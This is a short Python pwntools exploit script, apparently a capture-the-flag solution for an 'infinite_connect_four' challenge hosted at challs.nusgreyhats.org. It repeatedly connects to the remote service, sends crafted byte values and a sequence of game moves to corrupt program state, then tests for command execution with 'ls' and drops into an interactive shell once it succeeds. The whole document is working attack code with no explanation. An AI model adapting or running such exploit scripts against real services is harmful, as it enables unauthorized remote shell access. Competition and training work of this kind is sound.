from pwn import *

elf = ELF("./infinite_connect_four_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf

# gdb.attach(p)

a = b'\x5f' 
b = b'\xc9'
while True:
    # p = process(stdout=PIPE)
    p = remote("challs.nusgreyhats.org", 33102)
    p.sendlineafter(b'> ', b)
    p.sendlineafter(b'> ', a)   

    for i in range(16):
        p.sendlineafter(b'> ', b'0')

    p.sendlineafter(b'> ', b'2')

    for i in range(16):
        p.sendlineafter(b'> ', b'1')

    p.sendlineafter(b'> ', b'a')    
    try: 
        p.sendlineafter(b'?\n', b'ls')
        leak = p.recvline(timeout=1)
        if(leak):
            p.interactive()
            break
    except EOFError:
        pass

    p.close()